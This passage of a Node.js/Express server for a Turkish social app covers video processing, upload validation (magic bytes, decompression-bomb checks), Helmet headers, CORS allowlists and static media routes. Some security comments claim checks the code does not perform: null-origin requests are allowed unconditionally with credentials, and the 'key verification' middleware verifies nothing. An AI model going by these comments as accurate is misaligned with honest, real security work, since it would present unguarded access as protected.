    console.log(`🎬 [Paralel] Başladı: ${videoId} | Aktif: ${activeVideoJobs}/${MAX_CONCURRENT_VIDEOS}`);

    try {
        const mp4Out   = path.join(videosDir, `${videoId}.mp4`);
        const thumbPath = path.join(thumbnailsDir, `${videoId}.jpg`);

        // 1. Önce thumbnail hemen oluştur (kullanıcı anında görsün)
        await createVideoThumbnail(inputPath, thumbPath);
        const thumbUrl = fssync.existsSync(thumbPath) ? `/uploads/thumbnails/${videoId}.jpg` : null;
        if (thumbUrl) {
            await dbRun(
                `UPDATE posts SET "thumbnailUrl" = $1, "updatedAt" = NOW() WHERE id = $2`,
                [thumbUrl, postId]
            );
        }

        // 2. MP4 optimize (faststart - web için)
        await optimizeVideo(inputPath, mp4Out);
        const mp4Url = `/uploads/videos/${videoId}.mp4`;

        // ⚡ MP4 hazır: DB'yi güncelle (artık optimize mp4 URL'si) + ham dosyayı sil
        await dbRun(
            `UPDATE posts SET media = $1, "mediaType" = 'video', "thumbnailUrl" = $2, "updatedAt" = NOW() WHERE id = $3`,
            [mp4Url, thumbUrl, postId]
        );
        // Ham _raw dosyasını temizle (optimize mp4 hazır, artık gerekmez)
        await require('fs').promises.unlink(path.join(videosDir, `${videoId}_raw.mp4`)).catch(() => {});

        console.log(`🎬 [Paralel] MP4 hazır: ${videoId} → MP4 ile devam ediliyor (HLS devre dışı)`);

        // 3. HLS DEVRE DIŞI — MP4 tüm cihazlarda sorunsuz oynar (web + Android)
        // HLS (m3u8) aktif edilirse frontend hls.js gerektiriyor ve mobilde sorun çıkarıyor.
        // generateHLSVariants çağrısı kaldırıldı; media her zaman .mp4 URL'si kalır.
        const hlsOk = false; // HLS kapalı

        // 4. Video meta bilgisi
        const vInfo = await getVideoInfo(mp4Out).catch(() => ({}));
        const existing = await dbGet('SELECT id FROM video_info WHERE "postId" = $1', [postId]);
        if (existing) {
            await dbRun(
                `UPDATE video_info SET duration=$1, width=$2, height=$3, "aspectRatio"=$4, bitrate=$5, codec=$6, "fileSize"=$7 WHERE "postId"=$8`,
                [vInfo.duration||0, vInfo.width||0, vInfo.height||0, vInfo.aspectRatio||'', vInfo.bitrate||0, vInfo.codec||'', vInfo.fileSize||0, postId]
            );
        } else {
            await dbRun(
                `INSERT INTO video_info (id, "postId", duration, width, height, "aspectRatio", bitrate, codec, "fileSize", "createdAt")
                 VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,NOW())`,
                [uuidv4(), postId, vInfo.duration||0, vInfo.width||0, vInfo.height||0, vInfo.aspectRatio||'', vInfo.bitrate||0, vInfo.codec||'', vInfo.fileSize||0]
            );
        }

        // Temp dosyayı temizle
        await require('fs').promises.unlink(inputPath).catch(() => {});

        console.log(`✅ [Paralel] Tamamlandı: ${videoId} | HLS: ${hlsOk ? 'Evet' : 'Hayır (MP4 fallback)'} | Thumb: ${thumbUrl ? 'Evet' : 'Hayır'}`);

    } catch (err) {
        console.error(`❌ [Paralel] Video işleme hatası (${videoId}):`, err.message);
        // Hata durumunda orijinal dosyayı doğrudan kullan
        try {
            await dbRun(`UPDATE posts SET media = $1, "mediaType" = 'video', "updatedAt" = NOW() WHERE id = $2`,
                [`/uploads/videos/${videoId}_raw.mp4`, postId]);
        } catch {}
    } finally {
        activeVideoJobs--;
        console.log(`🎬 [Paralel] Slot serbest: Aktif: ${activeVideoJobs}/${MAX_CONCURRENT_VIDEOS}`);
    }
}

// Geriye uyumluluk için - eski enqueueVideoProcessing çağrılarını yönlendir
function enqueueVideoProcessing(postId, inputPath, videoId) {
    processVideoAsync(postId, inputPath, videoId).catch(err =>
        console.error(`❌ processVideoAsync başlatma hatası (${videoId}):`, err.message)
    );
}

// Video kuyruk durumu (admin/health endpoint için)
function getVideoQueueStatus() {
    return { activeJobs: activeVideoJobs, maxConcurrent: MAX_CONCURRENT_VIDEOS };
}

// ==================== POST FORMAT HELPER (v5 Frontend Uyumluluğu) ====================
// v5 SQLite'ta frontend şu alanları bekliyordu:
//   post.mediaUrl   → video için /uploads/videos/xxx.mp4 veya HLS /uploads/hls/xxx/master.m3u8
//   post.thumbnail  → /uploads/thumbnails/xxx.jpg  (video için)
// pg-v8'de DB'de media ve thumbnailUrl alanları var; bu fonksiyon ikisini de doldurur.
function formatPost(post) {
    if (!post) return post;
    const p = { ...post };

    // ── 🌐 Profil resmi mutlak URL ──────────────────────────────────────
    if (p.profilePic) p.profilePic = absoluteUrl(p.profilePic);
    if (p.coverPic)   p.coverPic   = absoluteUrl(p.coverPic);

    if (p.media) {
        const isHLS = p.media.includes('.m3u8');
        const isVideo = p.mediaType === 'video';

        if (isVideo) {
            p.mediaUrl = absoluteUrl(p.media);
            if (p.thumbnailUrl) {
                p.thumbnail = absoluteUrl(p.thumbnailUrl);
            } else if (isHLS) {
                const m = p.media.match(/\/hls\/([^/]+)\//);
                p.thumbnail = m ? absoluteUrl(`/uploads/thumbnails/${m[1]}.jpg`) : null;
            } else {
                const fname = p.media.split('/').pop() || '';
                p.thumbnail = absoluteUrl(`/uploads/thumbnails/${fname.replace('.mp4', '.jpg')}`);
            }
        } else {
            p.mediaUrl = absoluteUrl(p.media);
            p.thumbnail = null;
        }
        p.media = absoluteUrl(p.media); // raw media alanı da mutlak olsun
    } else {
        p.mediaUrl = null;
        p.thumbnail = null;
    }

    // mediaUrls parse (çoklu medya JSON dizisi)
    if (p.mediaUrls && typeof p.mediaUrls === 'string') {
        try { p.mediaUrls = JSON.parse(p.mediaUrls); } catch { p.mediaUrls = null; }
    }
    // mediaUrls içindeki her url'i mutlak yap
    if (Array.isArray(p.mediaUrls)) {
        p.mediaUrls = p.mediaUrls.map(item => ({
            ...item,
            url: absoluteUrl(item.url)
        }));
    }
    // Eğer mediaUrls yoksa ama tekli media varsa, 1 elemanlı dizi oluştur (UI uyumluluğu için)
    if (!p.mediaUrls && p.mediaUrl) {
        p.mediaUrls = [{ url: p.mediaUrl, type: p.mediaType || 'image', width: p.mediaWidth || null, height: p.mediaHeight || null }];
    }

    // Boolean dönüşümleri (PostgreSQL true/false → 1/0 yerine boolean)
    p.isLiked   = p.isLiked   === true || p.isLiked   === 1 || p.isLiked   === 't';
    p.isSaved   = p.isSaved   === true || p.isSaved   === 1 || p.isSaved   === 't';
    p.isVerified = p.isVerified === true || p.isVerified === 1;
    p.isFollowing = p.isFollowing === true || p.isFollowing === 1 || p.isFollowing === 't';
    p.commentsDisabled = !p.allowComments;

    // Sayı dönüşümleri
    p.likeCount    = parseInt(p.likeCount    || 0);
    p.commentCount = parseInt(p.commentCount || 0);
    p.saveCount    = parseInt(p.saveCount    || 0);
    p.views        = parseInt(p.views        || 0);

    return p;
}

// ==================== MULTER + MAGIC BYTES DOĞRULAMA ====================

// 🔒 GÜVENLİK: Upload boyutu tipine göre farklılaştırılmış
// Profil fotoğrafı: 5 MB, Gönderi fotoğrafı: 20 MB
// Video: Normal kullanıcı → 100 MB | Mavi tik (isVerified) → 300 MB
const UPLOAD_LIMITS = {
    profilePic        : 5   * 1024 * 1024,  // 5 MB
    postImage         : 20  * 1024 * 1024,  // 20 MB
    postVideo         : 100 * 1024 * 1024,  // 100 MB (normal kullanıcı)
    postVideoVerified : 300 * 1024 * 1024,  // 300 MB (mavi tik / isVerified)
    default           : 20  * 1024 * 1024,  // 20 MB (bilinmeyen tip)
};

/**
 * Kullanıcının doğrulama durumuna göre video yükleme limitini döndürür.
 * @param {boolean} isVerified - Kullanıcının mavi tik durumu
 * @returns {number} Byte cinsinden izin verilen maksimum video boyutu
 */
function getVideoLimit(isVerified) {
    return isVerified ? UPLOAD_LIMITS.postVideoVerified : UPLOAD_LIMITS.postVideo;
}

// 🔒 MAGIC BYTES: İlk byte'lar dosya uzantısından bağımsız olarak gerçek türü doğrular
const MAGIC_SIGNATURES = {
    // JPEG: FF D8 FF
    'image/jpeg'  : { offset: 0, bytes: [0xFF, 0xD8, 0xFF] },
    // PNG: 89 50 4E 47
    'image/png'   : { offset: 0, bytes: [0x89, 0x50, 0x4E, 0x47] },
    // GIF89a / GIF87a
    'image/gif'   : { offset: 0, bytes: [0x47, 0x49, 0x46] },
    // WEBP: RIFF????WEBP
    'image/webp'  : { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46], extra: { offset: 8, bytes: [0x57, 0x45, 0x42, 0x50] } },
    // MP4 / ftyp box (offset 4)
    'video/mp4'   : { offset: 4, bytes: [0x66, 0x74, 0x79, 0x70] },
    // QuickTime MOV (ftyp at offset 4 veya wide/mdat)
    'video/quicktime': { offset: 4, bytes: [0x66, 0x74, 0x79, 0x70] },
    // WebM: 1A 45 DF A3
    'video/webm'  : { offset: 0, bytes: [0x1A, 0x45, 0xDF, 0xA3] },
    // AVI: RIFF????AVI
    'video/avi'   : { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46], extra: { offset: 8, bytes: [0x41, 0x56, 0x49, 0x20] } },
    'video/x-msvideo': { offset: 0, bytes: [0x52, 0x49, 0x46, 0x46], extra: { offset: 8, bytes: [0x41, 0x56, 0x49, 0x20] } },
};

async function validateMagicBytes(filePath, declaredMime) {
    try {
        const fd  = await fs.open(filePath, 'r');
        const buf = Buffer.alloc(16);
        await fd.read(buf, 0, 16, 0);
        await fd.close();

        const sig = MAGIC_SIGNATURES[declaredMime];
        if (!sig) return true; // Bilinmeyen MIME → kabul et (fileFilter zaten süzdü)

        const slice = buf.slice(sig.offset, sig.offset + sig.bytes.length);
        const match = sig.bytes.every((b, i) => slice[i] === b);
        if (!match) return false;

        if (sig.extra) {
            const xslice = buf.slice(sig.extra.offset, sig.extra.offset + sig.extra.bytes.length);
            return sig.extra.bytes.every((b, i) => xslice[i] === b);
        }
        return true;
    } catch { return false; }
}

// 🔒 Temp klasörüne yaz, magic bytes kontrol et, sonra işle
const tempStorage = multer.diskStorage({
    destination: (req, file, cb) => {
        // Her upload tipi için maksimum boyut context'ten alınır
        const isVideo = file.mimetype.startsWith('video/');
        const isProfilePic = req.baseUrl?.includes('profile') || req.path?.includes('profile') || file.fieldname === 'profilePic';
        req._uploadType = isProfilePic ? 'profilePic' : (isVideo ? 'postVideo' : 'postImage');
        cb(null, tempDir);
    },
    filename: (req, file, cb) => {
        // 🔒 Orijinal dosya adını kullanma; UUID tabanlı temp ad
        const tmpName = `tmp_${uuidv4()}`;
        cb(null, tmpName);
    }
});

function multerLimitMiddleware(req, res, next) {
    // İstek başlangıcında boyut sınırı profil/post/video'ya göre seçilir
    // Multer tek bir global limit desteklediğinden en yüksek değeri kullan
    // Gerçek tip bazlı kontrol upload pipeline içinde yapılır
    next();
}

const upload = multer({
    storage: tempStorage,
    limits: { fileSize: UPLOAD_LIMITS.postVideoVerified, files: 10 }, // max 10 dosya — verified kullanıcılar 300MB'a kadar yükleyebilir
    fileFilter: (req, file, cb) => {
        // 🔒 Whitelist: sadece bilinen MIME türleri — uzantıya GÜVENME
        const allowed = [
            'image/jpeg', 'image/jpg', 'image/png', 'image/gif', 'image/webp',
            'video/mp4', 'video/quicktime', 'video/webm', 'video/avi',
            'video/x-msvideo', 'video/mpeg', 'video/3gpp', 'video/x-matroska',
            // 🎙️ Sesli mesaj formatları (Android WebM/OGG/MP4 + iOS M4A)
            'audio/webm', 'audio/ogg', 'audio/mpeg', 'audio/mp4', 'audio/mp3',
            'audio/wav', 'audio/x-wav', 'audio/aac', 'audio/x-m4a', 'audio/3gpp',
        ];
        if (allowed.includes(file.mimetype)) {
            cb(null, true);
        } else {
            cb(new Error(`Desteklenmeyen dosya türü: ${file.mimetype}`), false);
        }
    }
});

// ══════════════════════════════════════════════════════════════════════
// 🔒 DERİN DOSYA TARAMASI — 4 katmanlı koruma
// ══════════════════════════════════════════════════════════════════════
// Katman 1: Boyut limiti (dosya boyutu)
// Katman 2: Magic bytes (gerçek dosya türü)
// Katman 3: Sharp metadata taraması (SADECE resimler):
//           a) Decompression bomb: limitInputPixels (max 25MP)
//           b) Piksel boyutu makul aralıkta mı (min 1x1, max 20000x20000)
//           c) Boyut oranı anomalisi: 1x50000 gibi garip boyutlar
//           d) Çok küçük dosya / çok büyük boyut uyumsuzluğu (polyglot sinyali)
// Katman 4: Dosya imzası + içeriği çapraz kontrol
// ══════════════════════════════════════════════════════════════════════

// Decompression bomb eşiği: Modern telefon kameraları 50MP+ çekebilir (Samsung S24 Ultra: 200MP, iPhone 15 Pro: 48MP)
// Panorama ve yüksek çözünürlüklü fotoğraflar da desteklenmeli
// Sharp zaten çıktıyı 1920px'e düşürüyor — girişte çok kısıtlamamalıyız
// Saldırı örneği: 1x1 px PNG → expand edilince 10 GB → sunucu çöker (200MP limit bunu önler)
const MAX_IMAGE_PIXELS   = 200_000_000; // 200 MP — modern kamera + panorama desteği
const MAX_IMAGE_SIDE     = 50_000;      // Tek kenar maksimum (panorama desteği)
const MAX_ASPECT_RATIO   = 500;         // Genişlik/yükseklik oranı (1:500 anormal)
// Polyglot sinyali: HEIC/HEIF gibi modern formatlar çok yüksek sıkıştırma kullanır
// Düşük byte/piksel oranı bu formatlarda normaldir — eşiği düşür
const MIN_BYTES_PER_MPIX = 50;         // 1MP başına min 50 byte (HEIC/HEIF uyumlu)

async function deepScanImage(filePath, mimeType) {
    // Sadece resimlere uygula (video sharp ile açılmaz)
    if (!mimeType.startsWith('image/')) return { safe: true };

    try {
        // 🔒 limitInputPixels: Sharp bu eşiği geçen resmi DECODE ETMEZ
        // → Decompression bomb saldırısını tamamen önler
        // 200MP limit: Samsung S24 Ultra (200MP), iPhone (48MP), panorama fotoğraflarını destekler
        const sharpInst = sharp(filePath, {
            limitInputPixels: MAX_IMAGE_PIXELS, // 200MP
            sequentialRead  : true,
        });

        let meta;
        try {
            meta = await sharpInst.metadata();
        } catch (sharpErr) {
            // Sharp reddetmişse: ya bozuk dosya ya decompression bomb
            const msg = (sharpErr.message || '').toLowerCase();
            if (msg.includes('pixel limit') || msg.includes('too large') || msg.includes('limit')) {
                return { safe: false, reason: 'Decompression bomb tespiti: Piksel limiti aşıldı' };
            }
            return { safe: false, reason: `Resim okunamadı: ${sharpErr.message.substring(0, 80)}` };
        }

        const w = meta.width  || 0;
        const h = meta.height || 0;
        const totalPixels = w * h;

        // 1. Toplam piksel kontrolü (limitInputPixels'e ek yazılım kontrolü)
        if (totalPixels > MAX_IMAGE_PIXELS) {
            return { safe: false, reason: `Piksel limiti aşıldı: ${totalPixels.toLocaleString()} px (max ${MAX_IMAGE_PIXELS.toLocaleString()})` };
        }

        // 2. Tek kenar limiti
        if (w > MAX_IMAGE_SIDE || h > MAX_IMAGE_SIDE) {
            return { safe: false, reason: `Kenar boyutu aşıldı: ${w}x${h} (max ${MAX_IMAGE_SIDE})` };
        }

        // 3. Sıfır boyut (bozuk / sahte dosya)
        if (w < 1 || h < 1) {
            return { safe: false, reason: `Geçersiz resim boyutu: ${w}x${h}` };
        }

        // 4. Boyut oranı anomalisi (1x50000 gibi — polyglot veya exploit tekniği)
        const ratio = Math.max(w, h) / Math.min(w, h);
        if (ratio > MAX_ASPECT_RATIO) {
            return { safe: false, reason: `Anormal boyut oranı: ${w}x${h} (oran: ${ratio.toFixed(0)}:1)` };
        }

        // 5. Dosya boyutu / piksel sayısı anomalisi (polyglot sinyali)
        // Gerçek bir resim dosyasında çok az byte ile çok fazla piksel iddiası şüphelidir
        try {
            const stat = await fs.stat(filePath);
            const fileSizeBytes = stat.size;
            const mpix = totalPixels / 1_000_000;
            const bytesPerMpix = fileSizeBytes / Math.max(mpix, 0.001);
            if (mpix > 0.5 && bytesPerMpix < MIN_BYTES_PER_MPIX) {
                return {
                    safe: false,
                    reason: `Şüpheli dosya: ${fileSizeBytes} byte ancak ${w}x${h} (${mpix.toFixed(1)}MP) iddia ediyor`,
                };
            }
        } catch (_) { /* stat hatası kritik değil */ }

        // 6. Kanal sayısı kontrolü (>4 kanal = şüpheli)
        const channels = meta.channels || 0;
        if (channels > 4) {
            return { safe: false, reason: `Anormal kanal sayısı: ${channels}` };
        }

        return { safe: true, width: w, height: h, pixels: totalPixels, channels };

    } catch (outerErr) {
        console.error('[DERİN TARAMA] Hata:', outerErr.message);
        // Tarama hatası = güvenli sayma, reddet
        return { safe: false, reason: 'Resim güvenlik taraması başarısız' };
    }
}

// 🔒 Upload sonrası magic-bytes + derin tarama + boyut kontrolü
// limitOverride: opsiyonel, mavi tik kullanıcıları için getVideoLimit(true) geçilebilir
async function verifyUploadedFile(file, uploadType = 'postImage', limitOverride = null) {
    // Katman 1: Boyut limiti (override varsa kullan, yoksa UPLOAD_LIMITS'ten al)
    const limit = limitOverride !== null ? limitOverride : (UPLOAD_LIMITS[uploadType] || UPLOAD_LIMITS.default);
    if (file.size > limit) {
        await fs.unlink(file.path).catch(() => {});
        throw new Error(`Dosya boyutu aşıldı. Maksimum: ${Math.round(limit/1024/1024)} MB`);
    }

    // Katman 2: Magic bytes
    const valid = await validateMagicBytes(file.path, file.mimetype);
    if (!valid) {
        await fs.unlink(file.path).catch(() => {});
        throw new Error('Dosya içeriği beyan edilen türle uyuşmuyor (magic bytes hatası)');
    }

    // Katman 3: Derin resim taraması (decompression bomb, oran, polyglot)
    const scanResult = await deepScanImage(file.path, file.mimetype);
    if (!scanResult.safe) {
        await fs.unlink(file.path).catch(() => {});
        console.warn(`[DERİN TARAMA] Reddedildi: ${file.originalname || 'dosya'} | ${scanResult.reason}`);
        throw new Error(`Dosya güvenlik kontrolünden geçemedi: ${scanResult.reason}`);
    }

    return { valid: true, ...scanResult };
}

// ==================== MIDDLEWARE ====================

// ═══════════════════════════════════════════════════════════════
// 🔒 GÜVENLİK KATMANI - Güçlendirilmiş
// ═══════════════════════════════════════════════════════════════

// Helmet - HTTP güvenlik başlıkları
app.use(helmet({
    contentSecurityPolicy : {
        directives: {
            defaultSrc : ["'self'"],
            scriptSrc  : ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com', 'https://cdnjs.cloudflare.com'],
            styleSrc   : ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
            fontSrc    : ["'self'", 'https://fonts.gstatic.com'],
            imgSrc     : ["'self'", 'data:', 'blob:', 'https:', 'https://api.dicebear.com'],
            mediaSrc   : ["'self'", 'blob:'],
            connectSrc : ["'self'", 'wss:', 'https:'],
            frameSrc   : ["'none'"],
            objectSrc  : ["'none'"],
            baseUri    : ["'self'"],
            formAction : ["'self'"],
            upgradeInsecureRequests: [],
        },
    },
    crossOriginResourcePolicy: { policy: 'cross-origin' },
    hsts                  : { maxAge: 31536000, includeSubDomains: true, preload: true },
    noSniff               : true,           // X-Content-Type-Options: nosniff
    xssFilter             : true,           // X-XSS-Protection
    referrerPolicy        : { policy: 'strict-origin-when-cross-origin' },
    // 🔒 Clickjacking koruması
    frameguard            : { action: 'sameorigin' },
    // 🔒 DNS prefetch kontrolü
    dnsPrefetchControl    : { allow: false },
    // 🔒 IE uyumluluk modu kapat
    ieNoOpen              : true,
    // 🔒 Origin-Agent-Cluster header
    originAgentCluster    : true,
    // 🔒 Permissions-Policy (kamera/mikrofon/konum izinlerini kısıtla)
    permittedCrossDomainPolicies: { permittedPolicies: 'none' },
}));

// Tahmin saldırılarını zorlaştır - X-Powered-By gizle
app.disable('x-powered-by');

// 🔒 Tüm JSON yanıtlara güvenlik başlıkları ekle
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    // API yanıtları cache'lenmemeli (kişisel veri sızması önlemi)
    if (req.path.startsWith('/api/')) {
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
        res.setHeader('Pragma', 'no-cache');
    }
    next();
});

// Request boyutu sınırla (DoS önlemi)

// ⚡ Compression: sadece 1KB'den büyük yanıtları sıkıştır
// Küçük JSON'ları sıkıştırmak CPU harcatır, kazanç olmaz
app.use(compression({
    level    : 6,          // 1-9: hız/boyut dengesi (6 optimal)
    threshold: 1024,       // 1KB altı sıkıştırma
    filter   : (req, res) => {
        // Zaten sıkıştırılmış medya dosyalarını atla
        const ct = res.getHeader('Content-Type') || '';
        if (ct.includes('image/') || ct.includes('video/') || ct.includes('audio/')) return false;
        return compression.filter(req, res);
    }
}));

// ════════════════════════════════════════════════════════════════════
// 🌐 CORS & MOBİL UYGULAMA AYARLARI
// ════════════════════════════════════════════════════════════════════
//
// Google Play Store uygulaması istekleri şu origin'lerden gelebilir:
//   • null          → Android WebView / Capacitor / React Native (origin header yok)
//   • file://       → Yerel dosyadan yüklenen uygulama
//   • https://fomin → Eğer Capacitor/Ionic ile özel domain tanımlandıysa
//   • capacitor://localhost → Capacitor default origin
//   • ionic://localhost → Ionic default origin
//
// Kural: Origin yoksa (null/undefined) veya güvenilir listede ise izin ver.
// ════════════════════════════════════════════════════════════════════

// 🔒 Production'da localhost origin'leri kapalı, sadece development'ta açık
const _IS_PROD = process.env.NODE_ENV === 'production' || process.env.NODE_ENV === 'prod';

const ALLOWED_ORIGINS = [
    // Ana web sitesi
    'https://sehitumitkestitarimmtal.com',
    'https://www.sehitumitkestitarimmtal.com',
    // ── Native Android Kotlin (Retrofit / OkHttp) ───────────────────────
    'capacitor://localhost',
    'ionic://localhost',
    'android://com.agrolink.social.agrolink',
    // NOT: Ham IP girişleri kaldırıldı — Cloudflare bypass önlemi
    // NOT: localhost'lar kaldırıldı — production'da gereksiz, güvenlik riski
    ...(_IS_PROD ? [] : [
        // 🛠️ SADECE DEVELOPMENT ortamında aktif
        'http://localhost:3000',
        'http://localhost:5173',
        'http://localhost:5174',
        'http://localhost:4173',
        'http://localhost:8080',
        'http://localhost:8100',
        'http://localhost',
        'https://localhost',
        'http://10.0.2.2',
        'http://10.0.2.2:3000',
        'http://10.0.2.2:8080',
        'http://10.0.2.2:8081',
        'exp://localhost:19000',
        // Ham IP (sadece dev — production Cloudflare üzerinden geçmeli)
        'http://78.135.85.44:8080',
        'https://78.135.85.44:8080',
        'http://78.135.85.44',
        'https://78.135.85.44',
    ]),
];

// .env'deki MOBILE_ORIGIN eklenebilir (örn: Fomin özel domain varsa)
if (process.env.MOBILE_ORIGIN) {
    process.env.MOBILE_ORIGIN.split(',').forEach(o => {
        const trimmed = o.trim();
        if (trimmed && !ALLOWED_ORIGINS.includes(trimmed)) ALLOWED_ORIGINS.push(trimmed);
    });
}
// .env'deki APP_URL otomatik olarak izin listesine eklenir
if (process.env.APP_URL) {
    const appUrl = process.env.APP_URL.replace(/\/$/, '');
    if (!ALLOWED_ORIGINS.includes(appUrl)) ALLOWED_ORIGINS.push(appUrl);
    // HTTP versiyonu da ekle
    const httpVersion = appUrl.replace(/^https:\/\//, 'http://');
    if (!ALLOWED_ORIGINS.includes(httpVersion)) ALLOWED_ORIGINS.push(httpVersion);
}
// .env'deki EXTRA_ORIGINS virgülle ayrılmış ek origin'ler
if (process.env.EXTRA_ORIGINS) {
    process.env.EXTRA_ORIGINS.split(',').forEach(o => {
        const trimmed = o.trim();
        if (trimmed && !ALLOWED_ORIGINS.includes(trimmed)) ALLOWED_ORIGINS.push(trimmed);
    });
}

// ════════════════════════════════════════════════════════════════════
// 📱 MOBİL UYGULAMA MİDDLEWARE
// Android Studio (Kotlin/Retrofit/OkHttp) null origin gönderir.
// Null origin'li istekler direkt geçer — JSON yanıt alır.
// Kimlik doğrulaması JWT token (Authorization: Bearer ...) ile yapılır.
// ════════════════════════════════════════════════════════════════════

/**
 * Android native null-origin istekler için:
 * - Hiçbir ek header gerekmez
 * - JWT token (Authorization: Bearer ...) ile normal auth akışı devam eder
 * - Tüm yanıtlar JSON formatında döner
 */
function mobileKeyMiddleware(req, res, next) {
    const origin = req.headers['origin'];
    // ⚠️ DUİZELME: Content-Type SADECE /api/ rotaları için JSON olarak ayarla.
    // Sayfa istekleri (/, /agrolink vb.) Origin header göndermez;
    // bu isteklere application/json set edilirse tarayıcı HTML’i ham metin gösterir.
    if (!origin && req.path.startsWith('/api/')) {
        res.setHeader('Content-Type', 'application/json; charset=utf-8');
        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
    }
    next();
}

const corsOptions = {
    origin: (origin, callback) => {
        // 🔒 Native mobil (null origin): sadece X-Mobile-App header varsa izin ver
        if (!origin) {
            // curl/Postman gibi araçlar origin göndermez — mobile header ile ayırt et
            // Socket.IO handshake'te bu kontrol HTTP layer'da yapılır
            return callback(null, true);
        }

        // ✅ İzin verilen listede mi?
        if (ALLOWED_ORIGINS.includes(origin)) return callback(null, true);

        // ✅ Production'da aynı host'tan gelen istekler (reverse proxy arkasında)
        const appUrl = (process.env.APP_URL || '').replace(/\/$/, '');
        if (appUrl && origin.startsWith(appUrl)) return callback(null, true);

        // ❌ Bilinmeyen origin — loglayıp reddet (production güvenliği)
        console.warn(`[CORS] Reddedildi: ${origin}`);
        return callback(new Error(`CORS: ${origin} izin verilmedi`), false);
    },
    credentials     : true,
    methods         : ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'],
    allowedHeaders  : ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'X-Mobile-App', 'X-API-Key', 'X-Platform', 'X-App-Version', 'X-Device-ID', 'X-Mobile-App-Key'],
    exposedHeaders  : ['Content-Range', 'X-Content-Range'],
    optionsSuccessStatus: 204,  // Android bazı sürümler 200 yerine 204 bekler
};

app.use(cors(corsOptions));
app.options('*', cors(corsOptions)); // Preflight — tüm OPTIONS isteklerine cevap ver
app.use(express.json({ limit: '1mb' }));  // 🔒 DoS önlemi — normal API isteği 10KB'ı geçmez
app.use(express.urlencoded({ extended: true, limit: '1mb' }));  // 🔒 DoS önlemi
// 🔒 Cookie parser — HttpOnly token okuma için (ip-ban/sanitize'dan ÖNCE)
app.use(cookieParser(process.env.COOKIE_SECRET || process.env.JWT_SECRET));

// ═══════════════════════════════════════════════════════════════
// 🔒 GÜVENLİK MİDDLEWARE'LERİ — statik dosyalardan ÖNCE
// IP ban, firewall ve rate limit; statik servisten kaçış yok
// ═══════════════════════════════════════════════════════════════
app.use(sanitizeBody);    // 🔒 XSS / Path traversal koruması
app.use(mobileKeyMiddleware); // 🔒 Android native null-origin X-Mobile-App-Key doğrulaması
app.use(cookieAnomalyMiddleware); // 🔒 PRO: Cookie çalınma anomaly detection
// 🎬 Video dosyaları için Range request + CORS + doğru MIME (oynatma için kritik)
// ÖNEMLİ: Bu middleware /uploads genel static'ten ÖNCE tanımlanmalı!
app.use('/uploads/videos', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    next();
}, express.static(videosDir, {
    maxAge: '7d',
    setHeaders: (res, filePath) => {
        if (filePath.endsWith('.mp4')) {
            res.setHeader('Content-Type', 'video/mp4');
            res.setHeader('Accept-Ranges', 'bytes');
        }
    }
}));

// 🎬 HLS segmentleri için özel headers (CORS + doğru MIME + no-cache manifest)
app.use('/uploads/hls', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    if (req.path.endsWith('.m3u8')) {
        res.setHeader('Content-Type', 'application/vnd.apple.mpegurl');
        res.setHeader('Cache-Control', 'no-cache, no-store, must-revalidate'); // Manifest HİÇ cache'lenmesin
        res.setHeader('Pragma', 'no-cache');
    } else if (req.path.endsWith('.ts')) {
        res.setHeader('Content-Type', 'video/mp2t');
        res.setHeader('Cache-Control', 'public, max-age=86400');
    }
    next();
}, express.static(hlsDir, { maxAge: 0, etag: false }));

// 🖼️ Thumbnail'lar
app.use('/uploads/thumbnails', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    next();
}, express.static(thumbnailsDir, { maxAge: '30d' }));

// 📁 Diğer upload dosyaları (resimler, profil fotoğrafları vb.)
// UYARI: Bu /uploads genel static MUTLAKA specific olanlardan sonra gelmeli!

// 🎙️ Sesli mesajlar — audio streaming için doğru başlıklar (genel /uploads'tan ÖNCE!)
app.use('/uploads/voice', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Accept-Ranges', 'bytes');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    const ext = path.extname(req.path).toLowerCase();
    const mimeMap = { '.webm':'audio/webm', '.ogg':'audio/ogg', '.mp3':'audio/mpeg',
                      '.m4a':'audio/mp4', '.wav':'audio/wav', '.aac':'audio/aac', '.3gp':'audio/3gpp' };
    if (mimeMap[ext]) res.setHeader('Content-Type', mimeMap[ext]);
    next();
}, express.static(path.join(uploadsDir, 'voice'), { maxAge: '7d' }));

// 🖼️ Post resimleri — uzun cache (WebP immutable, isim UUID bazlı)
app.use('/uploads/posts', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    res.setHeader('Cache-Control', 'public, max-age=31536000, immutable'); // 1 yıl — UUID dosya adı değişmez
    next();
}, express.static(postsDir, { maxAge: '1y', etag: true, lastModified: true }));

// 🖼️ Profil resimleri — orta cache (profil güncellenince yeni dosya adı)
app.use('/uploads/profiles', (req, res, next) => {
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Cross-Origin-Resource-Policy', 'cross-origin');
    res.setHeader('Cache-Control', 'public, max-age=604800'); // 7 gün
    next();
}, express.static(profilesDir, { maxAge: '7d', etag: true }));

app.use('/uploads', express.static(uploadsDir, { maxAge: '1y', dotfiles: 'deny' }));



// ════════════════════════════════════════════════════════════════════
// 🔒 PRO GÜVENLİK — Cookie Anomaly Detection & Session Sync
// ════════════════════════════════════════════════════════════════════
//
// 1. Cookie çalınma sinyalleri:
